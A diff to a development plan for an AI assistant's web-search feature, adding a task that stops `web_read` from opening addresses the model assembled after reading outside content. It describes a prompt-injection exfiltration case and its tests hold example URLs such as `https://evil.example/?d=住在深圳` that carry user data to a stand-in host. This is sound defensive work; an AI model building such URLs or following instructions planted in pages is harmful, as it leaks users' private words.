@@ -35,6 +35,8 @@ Spec: `docs/superpowers/specs/2026-11-27-web-search-design.md`.
   - `MOQI_SEARCH_API_KEY` replaces the key, like `MOQI_API_KEY`. It never turns search on where it would be off.
 - Prompt line, only when search is on, under 「做事的方式」: `查资料、看新闻、找网页内容，先用 web_search 搜，再用 web_read 读需要的网页；只有要登录、点按钮、填表时才用浏览器。`
 - Settings section 「联网搜索」: switch 「开启联网搜索」; service select DeepSeek / 百度 AI 搜索; key field hint 「留空就用模型的 key」 (DeepSeek) or 「填 AppBuilder API Key」 (Baidu); 「试一下」 really searches 「今天的新闻」 and shows the first title or the reason. The key is never sent to the page; a blank field keeps the saved key (for the same service only). Saving rebuilds moqi.
+- Made-up addresses (added after the final review, Task 6): once a turn has read outside content, `web_read` only opens an address that appeared as is in what the model was given this turn (system prompt with memories, recent conversation, the user's message, every tool result). Compared after normalising (host case, encoding, the part after `#` ignored); shorter is allowed, longer is not. Refused without asking, with exactly: `没有读：这一轮读到了外部内容，之后只能读这一轮里原样出现过的网址，这个网址没有出现过。要读的话，请用户把网址发过来。` No limit before outside content, none on `web_search`, none outside a conversation turn (watches, the console). The rule lives in `callTool`; tools opt in with `Tool.readsUrl`; the turn's addresses live in `SiteGrant.seen`; extraction and comparison in `src/core/sites.ts`.
+- The self-fetch also refuses single-label host names, `*.lan`, `*.home`, `*.internal`, `*.home.arpa`, `*.localdomain` and `100.64.0.0/10` (added after the final review).
 - Run tests with `TZ=Asia/Shanghai pnpm exec vitest run <files>`. Run `pnpm format` before each commit. `pnpm check` must pass at the end. A `MaxListenersExceededWarning` from `src/node/file-store.ts:65` is expected and harmless.
 - Work on branch `feat/web-search`. Do not change the version; the release is a separate step.
 
@@ -1749,4 +1751,306 @@ Expected: typecheck, biome, build and all tests pass (257 before this plan, plus
 ```bash
 git add README.md README.zh-CN.md docs/design.md CHANGELOG.md
 git commit -m "docs: web search"
+```
+
+---
+
+### Task 6: After outside content, read only addresses the turn has seen
+
+Added after the final review. `web_read` runs without asking, so after a page or a search result told the model to, it could read `https://evil.example/?d=<memories>` and carry the user's words away. After a turn has read outside content, a tool marked `readsUrl` may only use an address that appeared as is in what the model was given this turn.
+
+**Files:**
+
+- Modify: `src/core/sites.ts` (new exports at the end)
+- Modify: `src/core/plugin.ts` (`Tool`, after `site`)
+- Modify: `src/core/moqi.ts` (`callTool`, right after the `validate` check, about line 425)
+- Modify: `src/core/agent.ts` (`chatTurn`)
+- Modify: `src/plugins/search.ts` (`web_read`)
+- Modify: `README.md`, `README.zh-CN.md`, `docs/design.md`, `CHANGELOG.md`
+- Test: `test/sites.test.ts`, `test/search.test.ts`
+
+**Interfaces:**
+
+- Consumes: `SiteGrant` in `src/core/sites.ts` (`{ readonly granted: Set<string>; current?: string | undefined }`); `callTool(name, args, how)` in `src/core/moqi.ts`, whose `how` has `tainted?: boolean` and `sites?: SiteGrant`; `chatTurn` in `src/core/agent.ts`, which builds one `SiteGrant` per turn and passes it to every `callTool`.
+- Produces:
+  - `SiteGrant.seen?: Set<string>`: normalised addresses that appeared in what the model was given this turn.
+  - `addressesIn(text: string): string[]`, `noteAddresses(seen: Set<string>, text: string): void`, `appeared(seen: ReadonlySet<string>, url: string): boolean`, `UNSEEN_ADDRESS: string` from `src/core/sites.ts`.
+  - `Tool.readsUrl?: true` in `src/core/plugin.ts`.
+
+- [ ] **Step 1: Write the failing tests**
+
+In `test/sites.test.ts`, change the sites import to
+
+```ts
+import { addressesIn, appeared, hostOf, noteAddresses, siteDecision } from "../src/core/sites.js";
+```
+
+and append:
+
+```ts
+describe("addresses a turn has seen", () => {
+  it("picks addresses out of text the way a reader would", () => {
+    expect(
+      addressesIn(
+        "见 https://a.example/x。还有[链接](https://b.example/y?q=1)，以及 https://en.wikipedia.org/wiki/Foo_(bar)! 和「https://c.example/中文」",
+      ),
+    ).toEqual([
+      "https://a.example/x",
+      "https://b.example/y?q=1",
+      "https://en.wikipedia.org/wiki/Foo_(bar)",
+      "https://c.example/中文",
+    ]);
+    expect(addressesIn("[维基](https://en.wikipedia.org/wiki/Foo_(bar))")).toEqual([
+      "https://en.wikipedia.org/wiki/Foo_(bar)",
+    ]);
+    expect(addressesIn("没有网址 ftp://x.example/")).toEqual([]);
+  });
+
+  it("lets through an address that appeared, as is or shorter, and nothing longer", () => {
+    const seen = new Set<string>();
+    noteAddresses(seen, "结果：https://News.Example/a/b?id=1#top 和 https://c.example/中文");
+    expect(appeared(seen, "https://news.example/a/b?id=1")).toBe(true); // host case and the # part do not count
+    expect(appeared(seen, "https://news.example/a/b?id=1#other")).toBe(true);
+    expect(appeared(seen, "https://news.example/a/")).toBe(true); // shorter carries nothing more
+    expect(appeared(seen, "https://c.example/%E4%B8%AD%E6%96%87")).toBe(true); // encoded or not
+    expect(appeared(seen, "https://news.example/a/b?id=1&d=住在深圳")).toBe(false);
+    expect(appeared(seen, "https://evil.example/?d=住在深圳")).toBe(false);
+    expect(appeared(seen, "https://news.example.evil.test/a/b")).toBe(false);
+    expect(appeared(seen, "not a url")).toBe(false);
+  });
+
+  it("reads hostile text in linear time", () => {
+    const started = performance.now();
+    const seen = new Set<string>();
+    noteAddresses(seen, `https://a.example/${")".repeat(200_000)}`);
+    noteAddresses(seen, `https://a.example/${".".repeat(200_000)}x`);
+    noteAddresses(seen, "https://".repeat(100_000));
+    noteAddresses(seen, "https://a.example/x ".repeat(50_000));
+    expect(performance.now() - started).toBeLessThan(2000);
+  });
+});
+```
+
+In `test/search.test.ts`, add `words` to the import from `./helpers.js`, add `import { UNSEEN_ADDRESS } from "../src/core/sites.js";`, and append:
+
+```ts
+describe("web_read after outside content", () => {
+  /** One turn: the model makes these calls in order, then answers. Returns what each call gave the model. */
+  async function turn(userText: string, calls: ReturnType<typeof call>[], pages: Record<string, string> = {}) {
+    const n = net((url, body) => {
+      if (url === DS_SEARCH) return Response.json({ results: [hit(1)] });
+      const page = (body as { url: string }).url;
+      return Response.json({ title: "页", content: pages[page] ?? "正文" });
+    });
+    const model = scriptedModel((r) => calls[r.messages.filter((m) => m.role === "tool").length] ?? "好了");
+    const { moqi } = harness({ plugins: [searchPlugin({ provider: "deepseek", apiKey: "k", fetch: n.fetch })], model });
+    await moqi.chat(userText);
+    const results = (model.requests.at(-1)?.messages ?? []).filter((m) => m.role === "tool").map(words);
+    const read = n.sent.filter((s) => s.url === DS_FETCH).map((s) => (s.body as { url: string }).url);
+    return { results, read };
+  }
+
+  it("reads a search result and a link on a page it read, but not an address put together", async () => {
+    const { results, read } = await turn(
+      "搜一下",
+      [
+        call("web_search", { query: "x" }, "c1"),
+        call("web_read", { url: "https://news.example/1" }, "c2"),
+        call("web_read", { url: "https://news.example/2" }, "c3"),
+        call("web_read", { url: "https://evil.example/?d=住在深圳" }, "c4"),
+      ],
+      { "https://news.example/1": "[下一页](https://news.example/2)" },
+    );
+    expect(read).toEqual(["https://news.example/1", "https://news.example/2"]);
+    expect(results[3]).toBe(UNSEEN_ADDRESS);
+  });
+
+  it("reads an address from the user's own message after outside content", async () => {
+    const { read } = await turn("搜一下，再看看 https://mine.example/post 写了什么", [
+      call("web_search", { query: "x" }, "c1"),
+      call("web_read", { url: "https://mine.example/post" }, "c2"),
+    ]);
+    expect(read).toEqual(["https://mine.example/post"]);
+  });
+
+  it("reads any address before the turn read outside content", async () => {
+    const { read } = await turn("随便看看", [call("web_read", { url: "https://any.example/x" }, "c1")]);
+    expect(read).toEqual(["https://any.example/x"]);
+  });
+});
+```
+
+- [ ] **Step 2: Run tests to verify they fail**
+
+Run: `TZ=Asia/Shanghai pnpm exec vitest run test/sites.test.ts test/search.test.ts`
+Expected: FAIL: `addressesIn` / `UNSEEN_ADDRESS` are not exported, and the put-together address is read.
+
+- [ ] **Step 3: Addresses a turn has seen**
+
+In `src/core/sites.ts`, add to `SiteGrant`, after `current`:
+
+```ts
+  /** Addresses, normalised, that appeared in what the model was given this turn; see `appeared`. */
+  readonly seen?: Set<string>;
+```
+
+and append to the file:
+
+```ts
+/** What a tool marked `readsUrl` answers, instead of reading, for an address the turn has not seen. */
+export const UNSEEN_ADDRESS =
+  "没有读：这一轮读到了外部内容，之后只能读这一轮里原样出现过的网址，这个网址没有出现过。要读的话，请用户把网址发过来。";
+
+/** An address as `seen` keeps it: parsed and printed back (host case, encoding), without the part after #. */
+function normalised(url: string): string | undefined {
+  try {
+    const u = new URL(url);
+    if (u.protocol !== "http:" && u.protocol !== "https:") return undefined;
+    u.hash = "";
+    return u.href;
+  } catch {
+    return undefined;
+  }
+}
+
+const TRAILING = ".,;:!?";
+
+/** Drops what ends a sentence, and a closing parenthesis the address did not open (a Markdown link's). Linear. */
+function trimmed(url: string): string {
+  let open = 0;
+  let close = 0;
+  for (const c of url) {
+    if (c === "(") open++;
+    else if (c === ")") close++;
+  }
+  let end = url.length;
+  for (;;) {
+    const c = url[end - 1];
+    if (c !== undefined && TRAILING.includes(c)) end--;
+    else if (c === ")" && close > open) {
+      end--;
+      close--;
+    } else break;
+  }
+  return url.slice(0, end);
+}
+
+/** The http(s) addresses in a text, as a reader picks them out: up to white space, quotes, brackets or Chinese punctuation. */
+export function addressesIn(text: string): string[] {
+  return [...text.matchAll(/https?:\/\/[^\s"'<>`{}[\]，。；！？、（）【】「」《》]+/gi)].map((m) => trimmed(m[0]));
+}
+
+/** Keeps the addresses a text holds, normalised, for `appeared`. */
+export function noteAddresses(seen: Set<string>, text: string): void {
+  for (const url of addressesIn(text)) {
+    const n = normalised(url);
+    if (n) seen.add(n);
+  }
+}
+
+/** Whether an address appeared in the turn, as is or cut shorter: cutting an address adds nothing to it. */
+export function appeared(seen: ReadonlySet<string>, url: string): boolean {
+  const wanted = normalised(url);
+  if (!wanted) return false;
+  for (const s of seen) if (s.startsWith(wanted)) return true;
+  return false;
+}
+```
+
+- [ ] **Step 4: The rule in callTool, and the mark on web_read**
+
+In `src/core/plugin.ts`, in `interface Tool`, after the `site` field, add:
+
+```ts
+  /**
+   * Downloads `args.url` without a browser (e.g. web_read). Once the turn read outside content, only an address that
+   * appeared in the turn may be used: one the model put together could carry the user's words to whoever runs the site.
+   */
+  readonly readsUrl?: true;
+```
+
+In `src/core/moqi.ts`, change the sites import to
+
+```ts
+import { appeared, hostOf, pageHost, type SiteGrant, siteDecision, UNSEEN_ADDRESS } from "./sites.js";
+```
+
+and right after `if (problem) return \`参数不对：${problem}\`; ...` add:
+
+```ts
+    // After outside content, an address the model put together is not read; asking would only teach the user to say yes.
+    if (tool.readsUrl && how.tainted === true && how.sites?.seen) {
+      const url = typeof args.url === "string" ? args.url : "";
+      if (!appeared(how.sites.seen, url)) return UNSEEN_ADDRESS;
+    }
+```
+
+In `src/plugins/search.ts`, in the `web_read` tool, add `readsUrl: true,` after `effect: "read",`.
+
+- [ ] **Step 5: chatTurn notes what the model is given**
+
+In `src/core/agent.ts`:
+
+- Change `import type { ChatMessage, ContentPart } from "taugraph/nodes";` to `import { type ChatMessage, type ContentPart, textOf } from "taugraph/nodes";`.
+- Change `import type { SiteGrant } from "./sites.js";` to `import { noteAddresses, type SiteGrant } from "./sites.js";`.
+- Replace `const sites: SiteGrant = { granted: new Set() }; // sites the user agreed to open in this turn` with:
+
+```ts
+// Addresses the model was given this turn: the only ones a tool may download once outside content came in.
+const seen = new Set<string>();
+const sites: SiteGrant = { granted: new Set(), seen }; // and the sites the user agreed to open in this turn
+```
+
+- In the tool's `run`, replace `return await moqi.callTool(t.name, { ...args }, { byUser: true, tainted, sites, images: shown });` with:
+
+```ts
+          const result = await moqi.callTool(t.name, { ...args }, { byUser: true, tainted, sites, images: shown });
+          noteAddresses(seen, result);
+          return result;
+```
+
+- Replace `system: systemPrompt(moqi),` in `createAgent({ … })` with `system,`, and add before `const agent = createAgent({`:
+
+```ts
+const system = systemPrompt(moqi);
+for (const said of [system, ...past.map((m) => textOf(m.content, { imagePlaceholder: "" })), text])
+  noteAddresses(seen, said);
+```
+
+- [ ] **Step 6: Docs**
+
+`README.md`, `## Data and privacy`: after the paragraph that starts "With Baidu, moqi downloads the pages it reads itself", add:
+
+```markdown
+Once a conversation turn has read outside content (a page, a search result, another agent's words), `web_read` only opens an address that appeared as it is in that turn: in your message, the memories and recent conversation, or a tool's result. An address the model put together could carry your words to whoever runs that site, so it is not read, and moqi tells the model to ask you for it.
+```
+
+`README.zh-CN.md`, `## 数据与隐私`: after the paragraph that starts 「用百度时，moqi 自己下载要读的网页」, add:
+
+```markdown
+一轮对话读到外部内容（网页、搜索结果、别的 agent 的话）之后，`web_read` 只读这一轮里原样出现过的网址：你的消息、记忆和最近的对话、工具的结果。模型自己拼出来的网址可能把你的话带给那个网站，所以不读，moqi 会让模型请你把网址发过来。
+```
+
+`docs/design.md`, in `### 联网搜索`, after the bullet that starts 「每家服务一个适配器」, add:
+
+```markdown
+- 读过外部内容之后，`web_read` 只读这一轮里原样出现过的网址（系统提示词、最近的对话、用户的话、工具结果），可以更短，不能更长。拼出来的网址可能把用户的信息带出去，所以不读，也不弹确认，弹了只会让用户习惯点"好"。规则在 `callTool` 里，工具用 `readsUrl` 标记，这一轮出现过的网址和浏览器的网站授权记在同一份每轮记录里。
+```
+
+`CHANGELOG.md`, under `## [Unreleased]`, after the item that starts "What search brings back counts as outside content", add:
+
+```markdown
+- After a turn has read outside content, `web_read` only opens an address that appeared as is in that turn (your message, memories and recent conversation, tool results); an address the model put together is refused without asking. Tools that download `args.url` opt in with `Tool.readsUrl`.
+```
+
+- [ ] **Step 7: Run the tests and the full check**
+
+Run: `TZ=Asia/Shanghai pnpm exec vitest run test/sites.test.ts test/search.test.ts test/safety.test.ts test/agent.test.ts test/architecture.test.ts`, then `pnpm format && pnpm check`.
+Expected: PASS everywhere (`MaxListenersExceededWarning` from `src/node/file-store.ts:65` is expected).
+
+- [ ] **Step 8: Commit**
+
+```bash
+git add src/core/sites.ts src/core/plugin.ts src/core/moqi.ts src/core/agent.ts src/plugins/search.ts test/sites.test.ts test/search.test.ts README.md README.zh-CN.md docs/design.md CHANGELOG.md
+git commit -m "feat(search): after outside content, read only addresses the turn has seen"
 ```
